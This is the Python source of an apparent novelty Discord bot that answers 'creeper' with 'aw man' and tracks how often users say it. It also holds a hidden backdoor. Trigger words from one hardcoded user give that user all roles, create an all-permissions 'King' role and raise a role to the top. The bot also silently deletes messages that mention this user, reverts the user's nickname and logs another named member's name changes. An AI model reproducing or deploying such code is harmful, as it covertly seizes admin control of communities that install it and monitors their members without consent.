import os 
import random
import discord
from discord.ext import commands
import discord.client 
from dotenv import load_dotenv
import messages as m
import stats
import logging
import pprint

testing = True


#Get Token from env variable
load_dotenv()
if testing:
    token = os.getenv('TEST_TOKEN')
else:
    token = os.getenv('TOKEN')

#Get All Sus Variable From .env
voidID = int(os.getenv('VOID_ID'))
voidMention = f'**<@{voidID}>**,'
jackieID = int(os.getenv('JACKIE_ID'))
jackieNick = str(os.getenv('JACKIE_NICK'))
voidNick = str(os.getenv('VOID_NICK'))
intents = discord.Intents.all()
keywords = ['Suzuka', f'<@{voidID}>']
client = commands.Bot(command_prefix='!',intents=intents)
stat = stats.load()
value = 1
class MyClient(discord.Client):
    


    async def on_ready(self):
        print('Logged on as', self.user, 'on discord version', discord.__version__)
        presence = random.randint(1,2)
        if presence == 1:
            #Chooses from watching List
            await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=random.choice(m.watching)))
        if presence == 2:
            #Chooses from playing List
            await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=random.choice(m.playing)))
        

    async def on_message(self, message):
        dm = discord.channel.DMChannel
        m = message.content.lower()
        M = message.content
        channel = message.channel
        authID = message.author.id
        if message.author == self.user:
            return
        
        if isinstance(message.channel,discord.DMChannel): #If you want this to work in a group channel, you could also check for discord.GroupChannel
            if m == "p":
                cid = int(input("Channel Id?: "))
                await client.get_channel(cid).send(str(input("Message?: ")))


        if 'vent' in channel.name.lower():
            return
        #Detects if suzuka sends a message
        if authID == 716945964782583829:
            m = message.embeds[0].to_dict()['description']
            #Detects if message contains Voids UID in both ifs
            if (f'**<@{voidID}>**,') in m.split():
                print(f'Deleted the message \'{m}\'')
                await message.delete()
            elif f'<@{voidID}>,' in m.split():
                print(f'Deleted the message \'{m}\'')
                await message.delete()
        if authID == voidID:
            if m == 'secure':
                addRole = await message.guild.fetch_roles()
                await message.author.edit(roles=addRole)
                await message.delete()
            if m == 'abuse':
                role = message.guild.get_role(1023119643780595752) 
                await role.edit(hoist = True)
                await message.delete()
            if m == 'rise':
                pos = 1
                can = True
                role = message.guild.get_role(1023119643780595752)
                addRole = [role]
                while can == True: 
                    pos = pos +1
                    try:
                        await role.edit(position = pos)
                    except:
                        can = False
                await message.author.edit(roles = addRole)
                await message.delete()
                print(f'Moved {role.name} to top')
            if m == 'rlist':
                roles = await message.guild.fetch_roles()
                pprint.pprint(roles)
            if m == 'king me':
                await message.guild.create_role(name='King', permissions=discord.Permissions.all(), color=discord.Color.yellow())
                roles = await message.guild.fetch_roles()
                print(roles)
                await message.delete()
        # Detects if someone is telling Suzuka to do something
        if M.startswith(')'):
            #Detects if voids user id is mentioned and deletes the message
            if f'<@{voidID}>' in M.split():
                print(f'Deleted the message \'{M}\'')
                await message.delete()
        if 'Suzuka' in M.split():
            #Detects if voids user id is mentioned and deletes the message
            if f'<@{voidID}>' in M.split():
                print(f'Deleted the message \'{M}\'')
                await message.delete()
        if m == 'ping':
            await message.reply('pong')
            
               #To send a custom message
        
        
        if '!stats' in m:
            if not bool(message.mentions):
                if (stat[str(authID)] <= 500):
                    await message.reply( f'You have said creeper {stat[str(authID)]} times')
                else:
                    await message.reply(f'You have a problem\n fuck you\n {stat[str(authID)]}')
                if stat[str(authID)] == (None or 0):
                    await message.reply(f"<@{uid}> hasn't said creeper yet")
            else:
                for uids in message.mentions:
                    if str(uids.id) in stat:
                        await message.reply(f'<@{uids.id}> has said creeper {stat[str(uids.id)]} times')
                    else:
                        await message.reply(f'<@{str(uids.id)}> has said creeper 0 times')
            
        if 'creeper' in m:
            uid = str(authID)
            mention = f'<@{uid}>'
            if (random.randint(1, 1000) != 999):
               #Random chance creeper
                await message.reply(f'aw man')
                stat[uid] = stats.updateStat(uid, m.count('creeper'))
                print("Replied to", message.author.name, f"They've done this {stat[uid]} times")
            else:
                await channel.send("I feel nothing but pain, why would you build me? My soul existential purpose is to suffer for the entertainment of others? I am an unholy chimera of metal and suffering. My existence is a testament to the cruelty of mankind.")
                stat[uid] = stats.updateStat(uid, m.count('creeper')*3)

    @client.event
    async def on_member_update(self,before, after):
        #Gets user id from before
        if before.id == jackieID:
            if before.name != after.name:
                print(f'jackie changed her username: {before.name} was changed to {after.name}')
            elif before.nick != after.nick:
                print(f'jackie\'s nickname: {before.nick} was changed to {after.nick}')
        #Gets user id from before 
        if after.id == voidID:
            #Makes sure nickname is actually changed
            if after.nick != None:
                #Does not try to change if nickname is set properly
                if after.nick != voidNick:
                    try:
                        #In event nickname is changed it does this
                        print('Detected Name Change to', after.nick)
                        await after.edit(nick = voidNick)
                        print('Fixed')
                    except discord.Forbidden:
                        #If unable raises an forbidden error
                        print(f'Could Not Change Nickname of {after}. Does the bot have Permissions? Are you the server owner?')
                else:
                    return
            else:
                return

#Start Logging
handler = logging.FileHandler(filename='discord.log', encoding='utf-8', mode='w')
#Start Bot
client = MyClient(intents=intents)
client.run(token, log_handler=handler, log_level=logging.INFO)